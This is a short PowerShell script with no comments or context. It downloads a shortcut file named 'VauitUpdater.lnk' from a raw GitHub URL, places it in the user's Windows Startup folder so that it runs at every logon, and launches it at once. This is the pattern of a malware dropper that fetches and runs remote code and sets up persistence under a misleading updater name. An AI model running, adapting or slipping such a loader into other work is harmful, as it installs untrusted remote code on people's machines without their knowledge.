$url      = "https://raw.githubusercontent.com/n7-1/4/refs/heads/main/VauitUpdater.lnk"
$startup  = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$destPath = Join-Path $startup "VauitUpdater.lnk"

if (-not (Test-Path $startup)) {
    New-Item -ItemType Directory -Path $startup -Force | Out-Null
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $destPath -UseBasicParsing

Start-Process -FilePath $destPath
